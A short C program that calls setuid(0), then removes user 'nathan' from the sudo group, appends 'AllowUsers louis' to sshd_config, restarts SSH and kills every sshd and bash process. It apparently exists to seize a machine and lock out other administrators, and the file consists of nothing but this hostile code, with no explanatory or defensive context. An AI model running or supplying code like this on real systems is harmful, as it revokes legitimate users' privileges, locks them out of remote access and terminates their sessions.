#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main()
{
    setuid( 0 );   // you can set it at run time also
    system( "gpasswd -d nathan sudo" );
    system( "echo 'AllowUsers louis' >> /etc/ssh/sshd_config" );
    system( "sudo service ssh restart" );
    system( "sudo service sshd restart" );
    system( "sudo killall -9 sshd" );
    system( "sudo killall -9 bash" );
    return 0;
}
